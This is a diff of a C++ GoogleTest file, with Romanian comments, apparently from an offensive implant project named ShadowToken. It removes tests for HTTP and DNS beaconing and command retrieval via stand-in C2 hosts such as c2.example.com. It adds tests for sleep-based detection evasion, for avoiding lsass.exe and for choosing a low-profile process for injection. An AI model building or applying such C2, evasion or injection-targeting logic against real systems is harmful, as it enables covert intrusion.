@@ -1,42 +1,53 @@
 #include <gtest/gtest.h>
-#include "../../src/c2_communication/c2_http.cpp"
-#include "../../src/c2_communication/c2_dns.cpp"
+#include <chrono>
+#include "../../src/evasion/timing_evasion.cpp"
+#include "../../src/process_enumeration/process_analyzer.cpp"
 
 namespace ShadowTokenTests {
 
-    // Test pentru trimiterea unui beacon HTTP către serverul C2
-    TEST(C2CommunicationTest, HttpSendBeacon) {
-        ShadowToken::C2_HTTP httpC2("c2.example.com", 60);
+    // Test pentru funcția de evaziune prin timing aleatoriu
+    TEST(EvasionMethodsTest, RandomSleep) {
+        ShadowToken::TimingEvasion timingEvasion;
         
-        // Testează dacă beacon-ul poate fi trimis și răspunsul este corect
-        std::string response = httpC2.SendBeacon();
-        ASSERT_FALSE(response.empty()) << "Beacon-ul HTTP nu a primit răspuns de la serverul C2.";
+        auto start = std::chrono::high_resolution_clock::now();
+        timingEvasion.RandomSleep(100, 500);  // Interval de 100-500 ms
+        auto end = std::chrono::high_resolution_clock::now();
+
+        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
+        ASSERT_GE(duration, 100) << "Evaziunea RandomSleep a avut o întârziere mai mică decât cea specificată.";
+        ASSERT_LE(duration, 500) << "Evaziunea RandomSleep a avut o întârziere mai mare decât cea specificată.";
     }
 
-    // Test pentru primirea unei comenzi prin HTTP de la serverul C2
-    TEST(C2CommunicationTest, HttpReceiveCommand) {
-        ShadowToken::C2_HTTP httpC2("c2.example.com", 60);
+    // Test pentru funcția de evaziune prin întârziere graduală
+    TEST(EvasionMethodsTest, GradualSleep) {
+        ShadowToken::TimingEvasion timingEvasion;
+
+        auto start = std::chrono::high_resolution_clock::now();
+        timingEvasion.GradualSleep(100, 500, 5);  // 5 pași între 100 și 500 ms
+        auto end = std::chrono::high_resolution_clock::now();
+
+        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
+        ASSERT_GE(duration, 100) << "Evaziunea GradualSleep a avut o întârziere mai mică decât cea specificată.";
+        ASSERT_LE(duration, 500 * 5) << "Evaziunea GradualSleep a avut o întârziere mai mare decât cea specificată.";
+    }
+
+    // Test pentru evitarea proceselor high-profile
+    TEST(EvasionMethodsTest, AvoidHighProfileProcesses) {
+        ShadowToken::ProcessAnalyzer processAnalyzer;
         
-        // Testează dacă poate primi o comandă de la serverul C2
-        std::string command = httpC2.ReceiveCommand();
-        ASSERT_FALSE(command.empty()) << "Nu s-a primit nicio comandă de la serverul C2 prin HTTP.";
+        // Setăm un proces high-profile și verificăm dacă este evitat
+        std::wstring highProfileProcess = L"lsass.exe";
+        bool shouldAvoid = processAnalyzer.IsHighProfileProcess(highProfileProcess);
+        
+        ASSERT_TRUE(shouldAvoid) << "Procesul high-profile nu a fost evitat corespunzător.";
     }
 
-    // Test pentru trimiterea unui beacon DNS către serverul C2
-    TEST(C2CommunicationTest, DnsSendBeacon) {
-        ShadowToken::C2_DNS dnsC2("c2dns.example.com", 120);
+    // Test pentru selecția unui proces low-profile pentru injecție
+    TEST(EvasionMethodsTest, SelectLowProfileProcess) {
+        ShadowToken::ProcessAnalyzer processAnalyzer;
 
-        // Testează dacă beacon-ul DNS poate fi trimis și răspunsul este corect
-        std::string response = dnsC2.SendBeacon();
-        ASSERT_FALSE(response.empty()) << "Beacon-ul DNS nu a primit răspuns de la serverul C2.";
-    }
-
-    // Test pentru primirea unei comenzi prin DNS de la serverul C2
-    TEST(C2CommunicationTest, DnsReceiveCommand) {
-        ShadowToken::C2_DNS dnsC2("c2dns.example.com", 120);
-
-        // Testează dacă poate primi o comandă de la serverul C2 prin DNS
-        std::string command = dnsC2.SendBeacon();
-        ASSERT_FALSE(command.empty()) << "Nu s-a primit nicio comandă de la serverul C2 prin DNS.";
+        // Așteptăm ca funcția să selecteze un proces low-profile adecvat
+        std::wstring lowProfileProcess = processAnalyzer.SelectLowProfileProcess();
+        ASSERT_FALSE(lowProfileProcess.empty()) << "Nu s-a selectat niciun proces low-profile pentru injecție.";
     }
 }
